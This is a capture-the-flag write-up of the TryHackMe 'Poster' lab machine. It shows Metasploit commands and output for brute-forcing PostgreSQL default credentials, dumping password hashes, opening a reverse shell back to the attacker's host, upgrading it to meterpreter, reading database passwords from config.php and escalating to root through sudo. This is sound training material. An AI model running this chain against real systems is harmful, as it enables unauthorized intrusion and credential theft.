---
layout: default
title : m3dsec - Poster write-up
---

_**Sep 13, 2020**_

## Overview

quick techniqual writeup, explaining how we got root user on [Poster](https://tryhackme.com/room/poster) machine from [tryhackme](https://tryhackme.com/).

## Target Informations

```
IP ADRESS   : 10.10.207.249
Host Name   : poster.thm
Dificulty   : easy
Description : The sys admin set up a rdbms in a safe way.
```

## EXTERNAL ENUMERATION

**nmap scanning**

```
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb (RSA)
|   256 eb:3a:a3:4e:6f:10:00:ab:ef:fc:c5:2b:0e:db:40:57 (ECDSA)
|_  256 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de (ED25519)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Poster CMS
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10
| ssl-cert: Subject: commonName=ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-07-29T00:54:25
| Not valid after:  2030-07-27T00:54:25
| MD5:   da57 3213 e9aa 9274 d0be c1b0 bbb2 0b09
|_SHA-1: 4e03 8469 28f7 673b 2bb2 0440 4ba9 e4d2 a0d0 5dd5
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne
```


port **80** has a static website, with an email news letter post submit form, tested it, nothing special

port **5432** sounds like a good entry, but mostly we'll need to be authenticated in order to abuse postgresql, 

what is a postgressql database:
> from [wikipedia](https://en.wikipedia.org/wiki/PostgreSQL), Postgres is a free and open-source relational database management system (RDBMS) emphasizing extensibility and SQL compliance.

well, i'll be using metasploit to brute force postgress, and retrive some passwords, there is a quite good module for that **auxiliary/scanner/postgres/postgres_login**

```
msf5 > use auxiliary/scanner/postgres/postgres_login
msf5 auxiliary(scanner/postgres/postgres_login) > set RHOSTS 10.10.207.249
RHOSTS => 10.10.207.249
msf5 auxiliary(scanner/postgres/postgres_login) > run
[-] 10.10.207.249:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
...
[+] 10.10.207.249:5432 - Login Successful: postgres:password@template1
```

and we got a hit, the database is not properly configured and the default credentials provided for initial authentication and configuration are never changed.

```
username : postgres
password : password
database : template1
```

we can always grab the database version if we need to with **auxiliary/admin/postgres/postgres_sql** module

```
msf5 auxiliary(scanner/postgres/postgres_login) > use auxiliary/admin/postgres/postgres_sql
msf5 auxiliary(admin/postgres/postgres_sql) > run
[*] Running module against 10.10.207.249

    version
    -------
    PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit

[*] Auxiliary module execution completed
```

or maybe dump the users hashes, for a later offline brute force attack

```
msf5 auxiliary(admin/postgres/postgres_sql) > use auxiliary/scanner/postgres/postgres_hashdump
msf5 auxiliary(scanner/postgres/postgres_hashdump) > run

[+] Query appears to have run successfully
[+] Postgres Server Hashes
======================

 Username   Hash
 --------   ----
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc
```


we can also read specific files from the target server with **auxiliary/admin/postgres/postgres_readfile** or maybe execute arbitrary commands with **exploit/multi/postgres/postgres_copy_from_program_cmd_exec**


now as we have what we need (credentials), lets get a reverse shell on the target host

_Tip : when working with metsploit, using **setg** instead of **set**, will set the value globaly so u wont need to set that value again_

```
msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > setg LHOST 10.9.123.226 
LHOST => 10.9.123.226
msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > setg USERNAME postgres
USERNAME => postgres
msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > setg PASSWORD password
PASSWORD => password
msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run

[*] Started reverse TCP handler on 10.9.123.226:4444 
[*] 10.10.207.249:5432 - 10.10.207.249:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
[*] 10.10.207.249:5432 - Exploiting...
[+] 10.10.207.249:5432 - 10.10.207.249:5432 - v8waOXCAxJN dropped successfully
[+] 10.10.207.249:5432 - 10.10.207.249:5432 - v8waOXCAxJN created successfully
[+] 10.10.207.249:5432 - 10.10.207.249:5432 - v8waOXCAxJN copied successfully(valid syntax/command)
[+] 10.10.207.249:5432 - 10.10.207.249:5432 - v8waOXCAxJN dropped successfully(Cleaned)
[*] 10.10.207.249:5432 - Exploit Succeeded
[*] Command shell session 1 opened (10.9.123.226:4444 -> 10.10.207.249:51362) at 2020-09-11 22:21:39 +0100

id
uid=109(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
```

<br>

directly i upgraded my initial shell into a full meterpreter shell with **multi/manage/shell_to_meterpreter** module:

```
msf5 post(multi/manage/shell_to_meterpreter) > options 

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST    10.9.123.226     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION  1                yes       The session to run this module on.

msf5 post(multi/manage/shell_to_meterpreter) > set LHOST 10.9.123.226 
LHOST => 10.9.123.226
msf5 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
msf5 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.9.123.226:4433 
[*] Sending stage (980808 bytes) to 10.10.207.249
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
[*] Meterpreter session 3 opened (10.9.123.226:4433 -> 10.10.207.249:47894) at 2020-09-11 22:42:44 +0100
[*] Stopping exploit/multi/handler
msf5 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type                   Information                                                              Connection
  --  ----  ----                   -----------                                                              ----------
  1         shell cmd/unix                                                                                  10.9.123.226:4444 -> 10.10.207.249:51362 (10.10.207.249)
  2         meterpreter x86/linux  no-user @ ubuntu (uid=109, gid=117, euid=109, egid=117) @ 10.10.207.249  10.9.123.226:4433 -> 10.10.207.249:47894 (10.10.207.249)
```

<br>

## Internal Enumerations

running [Linpeas.sh](https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh) gave us the overal overview about our target, with some credentials from the database.

```
extracted some passwords
postgres:password
tryhackme:Hacktheplanet!
sistemas:1234abcd
ti:abcd1234
darkstart:qwerty
ssh_user:poster:batman'
poster:batman
```

and a really intersting file 

```
postgres@ubuntu:~$ cat /var/www/html/config.php
cat /var/www/html/config.php
<?php 
	
	$dbhost = "127.0.0.1";
	$dbuname = "alison";
	$dbpass = "p4ssw0rdS3cur3!#";
	$dbname = "mysudopassword";
```


with that passwods we can login as alison user


```
postgres@ubuntu:~$ su alison
Password: p4ssw0rdS3cur3!#
alison@ubuntu:~$ id
uid=1000(alison) gid=1000(alison) groups=1000(alison),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```

and it seems like alison is a member of sudo users, lets see if alison has some special sudo rights

```
alison@ubuntu:~$ sudo -l
[sudo] password for alison: p4ssw0rdS3cur3!#

Matching Defaults entries for alison on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

well, **(ALL : ALL) ALL** is a win for us, as alison has full privilege permissions over ubuntu host, we can quickly laverage to root user

```
alison@ubuntu:~$ sudo su
root@ubuntu:/home/alison# id
uid=0(root) gid=0(root) groups=0(root)
```

as our gole consist of retriving the flags

```
root@ubuntu:~# cat root.txt
THM{REDACTED}
root@ubuntu:~# cat /home/alison/user.txt
THM{REDACTED}
```
<br>
Best Regards

[m3dsec](https://twitter.com/m3dsec).

<br>
<br>

[back to main()](../../index.md)

<br>
<br>